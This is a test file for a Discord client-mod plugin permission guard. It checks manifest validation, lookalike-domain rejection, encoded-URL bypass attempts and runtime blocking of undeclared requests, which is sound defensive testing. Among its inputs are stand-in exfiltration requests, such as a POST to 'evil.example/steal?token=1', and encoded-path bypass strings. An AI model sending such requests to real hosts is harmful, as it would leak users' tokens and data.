import { afterEach, describe, expect, test } from "bun:test";
import { existsSync, readdirSync, readFileSync } from "fs";
import { join } from "path";

import {
    checkRequest,
    DeclaredPermissions,
    describeGrowth,
    hostAllowed,
    isMessageAction,
    isMessageStore,
    permissionGrowth,
    PluginPermissionError,
    readPermissions,
    samePermissions,
    whyNotPermissions,
} from "../src/shared/declaredPermissions";
import type { PluginManifest } from "../src/shared/ipc";
import { groupActivity } from "../src/shared/pluginActivity";
import { scanBundle } from "../src/shared/pluginPermissions";
import { buildEntry } from "../src/shared/registryEntry";
import { PluginActivity } from "../src/renderer/plugins/activity";
import { PluginGuard } from "../src/renderer/plugins/guard";

const declared = (p: Partial<DeclaredPermissions> = {}): DeclaredPermissions => ({ network: [], readMessages: false, sendMessages: false, changeSettings: false, ...p });
const DISCORD = "https://discord.com/channels/@me";

describe("declared permissions: the manifest", () => {
    test("valid declarations", () => {
        expect(whyNotPermissions({})).toBeUndefined();
        expect(whyNotPermissions({ network: ["api.example.com", "cdn.discordapp.com", "localhost"], readMessages: true, sendMessages: false, changeSettings: true })).toBeUndefined();
    });

    test("anything Evi would read differently is refused", () => {
        expect(whyNotPermissions(undefined)).toBeDefined();
        expect(whyNotPermissions([])).toBeDefined();
        expect(whyNotPermissions("all")).toBeDefined();
        expect(whyNotPermissions({ network: "api.example.com" })).toBeDefined();
        for (const bad of ["https://api.example.com", "api.example.com:443", "api.example.com/path", "*.example.com", "*", "com", "", "exa mple.com", 5]) {
            expect(whyNotPermissions({ network: [bad] })).toContain("permissions.network");
        }
        expect(whyNotPermissions({ network: Array.from({ length: 51 }, (_, i) => `h${i}.example.com`) })).toContain("at most 50");
        expect(whyNotPermissions({ readMessages: "yes" })).toContain("true or false");
        expect(whyNotPermissions({ fileSystem: true })).toContain("unknown key");
    });

    test("read leniently from disk: bad sites are dropped, only true is yes, no object is no declaration", () => {
        expect(readPermissions(undefined)).toBeUndefined();
        expect(readPermissions("all")).toBeUndefined();
        expect(readPermissions({ network: ["B.example.com", "a.example.com", "b.example.com", "https://x.com"], readMessages: "yes", sendMessages: true }))
            .toEqual(declared({ network: ["a.example.com", "b.example.com"], sendMessages: true }));
        expect(samePermissions(readPermissions({ network: ["b.com", "a.com"] }), readPermissions({ network: ["a.com", "b.com"], readMessages: false }))).toBe(true);
        expect(samePermissions(undefined, declared())).toBe(false);
        expect(samePermissions(undefined, undefined)).toBe(true);
    });

    test("a site covers its subdomains, never lookalikes", () => {
        const d = declared({ network: ["discordapp.com", "api.example.com"] });
        expect(hostAllowed(d, "cdn.discordapp.com")).toBe(true);
        expect(hostAllowed(d, "discordapp.com:443")).toBe(true);
        expect(hostAllowed(d, "API.example.com")).toBe(true);
        expect(hostAllowed(d, "example.com")).toBe(false);
        expect(hostAllowed(d, "evildiscordapp.com")).toBe(false);
        expect(hostAllowed(d, "discordapp.com.evil.net")).toBe(false);
    });

    test("what counts as messages", () => {
        for (const type of ["MESSAGE_CREATE", "MESSAGE_UPDATE", "MESSAGE_DELETE", "MESSAGE_DELETE_BULK", "LOCAL_MESSAGE_CREATE", "LOAD_MESSAGES_SUCCESS", "LOAD_MESSAGES_AROUND_SUCCESS", "SEARCH_FINISH", "DRAFT_CHANGE"]) {
            expect(isMessageAction(type)).toBe(true);
        }
        for (const type of ["MESSAGE_REACTION_ADD", "TYPING_START", "PRESENCE_UPDATES", "CHANNEL_SELECT", "MESSAGE_ACK", "BULK_ACK"]) expect(isMessageAction(type)).toBe(false);
        for (const name of ["MessageStore", "ReferencedMessageStore", "DraftStore", "RecentMentionsStore", "SearchStore"]) expect(isMessageStore(name)).toBe(true);
        for (const name of ["UserStore", "ChannelStore", "ReadStateStore", "UserSettingsProtoStore", "StickersStore"]) expect(isMessageStore(name)).toBe(false);
    });
});

describe("declared permissions: requests", () => {
    test("only declared sites, Discord's included", () => {
        const d = declared({ network: ["api.example.com"] });
        expect(checkRequest(d, "https://api.example.com/v1/x?key=1")).toBeUndefined();
        expect(checkRequest(d, "wss://api.example.com/socket")).toBeUndefined();
        expect(checkRequest(d, "https://evil.example/collect", "POST")).toEqual({ permission: "network", host: "evil.example" });
        expect(checkRequest(d, "https://cdn.discordapp.com/emojis/1.png")).toEqual({ permission: "network", host: "cdn.discordapp.com" });
        // Relative URLs are Discord's own page
        expect(checkRequest(d, "/api/v9/users/@me", "GET", DISCORD)).toEqual({ permission: "network", host: "discord.com" });
    });

    test("what isn't a network request is always fine", () => {
        const d = declared();
        expect(checkRequest(d, "data:text/plain,hi")).toBeUndefined();
        expect(checkRequest(d, "blob:https://discord.com/1234")).toBeUndefined();
        expect(checkRequest(d, "not a url")).toBeUndefined();
    });

    test("Discord's message and settings endpoints need their own permission, reading them doesn't", () => {
        const d = declared({ network: ["discord.com"] });
        expect(checkRequest(d, "/api/v9/channels/123/messages", "GET", DISCORD)).toBeUndefined();
        expect(checkRequest(d, "/api/v9/channels/123/messages", "POST", DISCORD)).toEqual({ permission: "sendMessages", host: "discord.com" });
        expect(checkRequest(d, "https://canary.discord.com/api/channels/123/messages/456", "patch")).toEqual({ permission: "sendMessages", host: "canary.discord.com" });
        expect(checkRequest(d, "https://discord.com/api/webhooks/1/token", "POST")).toEqual({ permission: "sendMessages", host: "discord.com" });
        expect(checkRequest(d, "https://discord.com/api/v10/interactions", "POST")).toEqual({ permission: "sendMessages", host: "discord.com" });
        expect(checkRequest(d, "https://discord.com/api/v9/users/@me/settings-proto/1", "PATCH")).toEqual({ permission: "changeSettings", host: "discord.com" });
        expect(checkRequest(d, "https://discord.com/api/v9/users/@me", "PATCH")).toEqual({ permission: "changeSettings", host: "discord.com" });
        expect(checkRequest(d, "https://discord.com/api/v9/users/@me/guilds/1/settings", "PATCH")).toEqual({ permission: "changeSettings", host: "discord.com" });
        expect(checkRequest(declared({ network: ["discord.com"], sendMessages: true, changeSettings: true }), "https://discord.com/api/v9/channels/1/messages", "POST")).toBeUndefined();
        // Only Discord's API: the same path elsewhere is just a site
        expect(checkRequest(declared({ network: ["api.example.com"] }), "https://api.example.com/api/channels/1/messages", "POST")).toBeUndefined();
    });

    test("other ways of writing the same endpoint need the same permission", () => {
        const d = declared({ network: ["discord.com"] });
        const send = { permission: "sendMessages", host: "discord.com" } as const;
        const settings = { permission: "changeSettings", host: "discord.com" } as const;
        expect(checkRequest(d, "https://discord.com./api/v9/channels/123/messages", "POST")).toEqual({ ...send, host: "discord.com." });
        expect(checkRequest(d, "https://discord.com/api/v9//channels/123/messages", "POST")).toEqual(send);
        expect(checkRequest(d, "https://discord.com/api/V9/channels/123/messages", "POST")).toEqual(send);
        expect(checkRequest(d, "https://discord.com/api/v9/%63hannels/123/messages", "POST")).toEqual(send);
        expect(checkRequest(d, "https://discord.com/api/v9/users/%40me", "PATCH")).toEqual(settings);
        expect(checkRequest(d, "https://discord.com/api/v9/users/@me/", "PATCH")).toEqual(settings);
        // A path that can't be decoded isn't let through
        expect(checkRequest(d, "https://discord.com/api/v9/users/%E0", "PATCH")).toEqual(send);
        expect(checkRequest(declared({ network: ["discord.com"], sendMessages: true, changeSettings: true }), "https://discord.com/api/v9/users/%E0", "PATCH")).toBeUndefined();
        // Other endpoints stay free to write
        expect(checkRequest(d, "https://discord.com/api/v9/channels/123/typing", "POST")).toBeUndefined();
    });
});

describe("declared permissions: updates", () => {
    test("asks for more: new sites, new yeses, or no declaration any more", () => {
        const before = declared({ network: ["example.com"], readMessages: true });
        expect(permissionGrowth(before, before)).toBeUndefined();
        expect(permissionGrowth(before, declared())).toBeUndefined();
        // A subdomain of a site it already had isn't more
        expect(permissionGrowth(before, declared({ network: ["api.example.com"] }))).toBeUndefined();
        const more = permissionGrowth(before, declared({ network: ["example.com", "other.net"], readMessages: true, sendMessages: true }));
        expect(more).toEqual({ hosts: ["other.net"], flags: ["sendMessages"], undeclared: false });
        expect(describeGrowth(more!)).toBe("It would also contact other.net, send messages.");
        expect(permissionGrowth(before, undefined)).toEqual({ hosts: [], flags: [], undeclared: true });
        // A version that never declared wasn't held to anything: declaring only narrows it
        expect(permissionGrowth(undefined, declared({ sendMessages: true }))).toBeUndefined();
    });

    test("the registry entry carries the manifest's declaration, and refuses a bad one", async () => {
        const files = (manifest: object) => ({
            "manifest.json": new TextEncoder().encode(JSON.stringify(manifest)),
            "index.js": new TextEncoder().encode("module.exports = {}"),
        });
        const options = { base: "https://evi.rest/store/plugins", today: "2026-09-28", eviVersion: "0.7.0" };
        const built = await buildEntry(files({ id: "p", name: "P", version: "1.0.0", permissions: { network: ["b.com", "a.com"], sendMessages: true } }), options);
        if ("error" in built) throw new Error(built.error);
        expect(built.entry.permissions).toEqual(declared({ network: ["a.com", "b.com"], sendMessages: true }));
        const legacy = await buildEntry(files({ id: "p", name: "P", version: "1.0.0" }), options);
        expect("entry" in legacy && legacy.entry.permissions).toBeUndefined();
        expect(await buildEntry(files({ id: "p", name: "P", version: "1.0.0", permissions: { network: ["http://a.com"] } }), options)).toHaveProperty("error");
    });
});

describe("declared permissions: enforcement", () => {
    const realFetch = globalThis.fetch;
    afterEach(() => void (globalThis.fetch = realFetch));
    const manifest = (id: string, permissions?: PluginManifest["permissions"]): PluginManifest => ({ id, name: id, permissions });

    test("a request outside the declaration is refused before it's sent, and noted as blocked", async () => {
        const sent: string[] = [];
        globalThis.fetch = (async (input: string) => (sent.push(String(input)), new Response("ok"))) as unknown as typeof fetch;
        const guard = new PluginGuard(manifest("enf-net", { network: ["api.example.com"] }));
        const net = PluginActivity.networkScope("enf-net", guard.checkRequest);

        expect((await net.fetch("https://api.example.com/v1")).status).toBe(200);
        const refused = await net.fetch("https://evil.example/steal?token=1", { method: "POST" }).catch(e => e);
        expect(refused).toBeInstanceOf(PluginPermissionError);
        expect(refused.message).toBe("enf-net can't contact evil.example: its manifest doesn't list it in permissions.network");
        expect(sent).toEqual(["https://api.example.com/v1"]);

        const events = PluginActivity.get("enf-net");
        expect(events.at(-1)).toMatchObject({ kind: "request", method: "POST", host: "evil.example", path: "/steal", blocked: "network" });
        const groups = groupActivity(events, guard.declared!.network);
        expect(groups.find(g => g.target === "evil.example")).toMatchObject({ count: 1, blocked: 1, recent: ["POST /steal blocked"] });
        expect(groups.find(g => g.target === "api.example.com")).toMatchObject({ blocked: 0, unexpected: false });
    });

    test("a plugin that doesn't declare isn't held to anything", async () => {
        globalThis.fetch = (async () => new Response("ok")) as unknown as typeof fetch;
        const guard = new PluginGuard(manifest("enf-legacy"));
        expect(guard.declared).toBeUndefined();
        const net = PluginActivity.networkScope("enf-legacy", guard.checkRequest);
        expect((await net.fetch("https://anywhere.example/")).status).toBe(200);
        expect(() => guard.need("sendMessages", "/x")).not.toThrow();
        expect(() => guard.flux("MESSAGE_CREATE")).not.toThrow();
    });

    test("messages, stores, hooks and commands need what they need", async () => {
        const guard = new PluginGuard(manifest("enf-msg", {}));
        expect(() => guard.flux("MESSAGE_CREATE")).toThrow(PluginPermissionError);
        expect(() => guard.flux("PRESENCE_UPDATES")).not.toThrow();
        expect(() => guard.store("MessageStore")).toThrow("enf-msg can't read messages (MessageStore): its manifest doesn't declare permissions.readMessages");
        expect(() => guard.store("UserStore")).not.toThrow();

        const dispatcher = { dispatch() { }, subscribe() { }, _actionHandlers: {} };
        const messageActions = { sendMessage() { }, editMessage() { }, deleteMessage() { }, sendBotMessage() { } };
        const store = { _dispatchToken: "1", getName: () => "MessageStore", getMessages() { } };
        expect(() => guard.hook(dispatcher, "dispatch")).toThrow(PluginPermissionError);
        expect(() => guard.hook({ MESSAGE_DELETE() { } }, "MESSAGE_DELETE")).toThrow(PluginPermissionError);
        expect(() => guard.hook(messageActions, "sendMessage")).toThrow(PluginPermissionError);
        expect(() => guard.hook(store, "getMessages")).toThrow(PluginPermissionError);
        expect(() => guard.hook({ startTyping() { } }, "startTyping")).not.toThrow();

        const command = guard.command({ name: "say", description: "", execute: () => ({ content: "hi" }) });
        await expect(Promise.resolve(command.execute({}, {} as any))).rejects.toThrow("enf-msg can't send messages (/say)");
        const quiet = guard.command({ name: "quiet", description: "", execute: () => ({ ephemeral: "only you" }) });
        expect(await quiet.execute({}, {} as any)).toEqual({ ephemeral: "only you" });

        const kinds = PluginActivity.get("enf-msg").map(e => [e.kind, e.blocked, e.target]);
        expect(kinds).toContainEqual(["permission", "readMessages", "MESSAGE_CREATE"]);
        expect(kinds).toContainEqual(["permission", "sendMessages", "/say"]);
        const groups = groupActivity(PluginActivity.get("enf-msg"));
        // One row per permission, what it tried newest first
        expect(groups.find(g => g.target === "readMessages")).toMatchObject({ kind: "permission", count: 6, blocked: 6, recent: ["MessageStore.getMessages", "sendMessage", "MESSAGE_DELETE"] });
    });

    test("declaring it lets it through", async () => {
        const guard = new PluginGuard(manifest("enf-ok", { readMessages: true, sendMessages: true }));
        expect(() => guard.flux("MESSAGE_CREATE")).not.toThrow();
        expect(() => guard.store("MessageStore")).not.toThrow();
        expect(await guard.command({ name: "say", description: "", execute: () => ({ content: "hi" }) }).execute({}, {} as any)).toEqual({ content: "hi" });
    });

    test("its own copy of @evi/api checks the same things", () => {
        const api = new PluginGuard(manifest("enf-api", {})).api();
        expect(() => api.getStore("MessageStore")).toThrow(PluginPermissionError);
        expect(() => api.findStoreLazy("ReferencedMessageStore")).toThrow(PluginPermissionError);
        expect(() => api.filters.byStoreName("DraftStore")).toThrow(PluginPermissionError);
        expect(() => api.Badges.setPrefs("1", {})).toThrow("enf-api can't change settings (badge settings)");
        // Everything else is the shared module
        expect(api.definePlugin).toBe(new PluginGuard(manifest("enf-api-2")).api().definePlugin);
        expect(typeof api.filters.byProps).toBe("function");
    });
});

describe("Evi's own plugins declare what their code does", () => {
    const root = join(import.meta.dir, "..", "plugins");
    const read = (dir: string): string => readdirSync(dir, { withFileTypes: true })
        .map(e => e.isDirectory() ? read(join(dir, e.name)) : /\.tsx?$/.test(e.name) && e.name !== "native.ts" ? readFileSync(join(dir, e.name), "utf8") : "")
        .join("\n");

    for (const id of readdirSync(root).filter(id => existsSync(join(root, id, "manifest.json")))) {
        test(id, () => {
            const manifest = JSON.parse(readFileSync(join(root, id, "manifest.json"), "utf8")) as PluginManifest;
            expect(whyNotPermissions(manifest.permissions)).toBeUndefined();
            const permissions = readPermissions(manifest.permissions)!;
            const code = read(join(root, id));
            const found = scanBundle(code);

            // What the guard would refuse at runtime
            const stores = [...found.stores, ...[...code.matchAll(/(?:byStoreName|withStore)\(\s*(?:\w+,\s*)?"(\w+)"/g)].map(m => m[1])];
            const readsMessages = stores.some(isMessageStore) || found.flux.some(isMessageAction)
                || /hook\.(?:before|after|instead)\(\s*Dispatcher\s*,\s*"dispatch"/.test(code)
                || /hookExport\([^)]*"(?:send|edit|delete)Message"/.test(code);
            if (readsMessages) expect(permissions.readMessages).toBe(true);
            if (/return\s*\{\s*content\s*:/.test(code)) expect(permissions.sendMessages).toBe(true);
            if (found.network.length) expect(permissions.network.length).toBeGreaterThan(0);
        });
    }
});
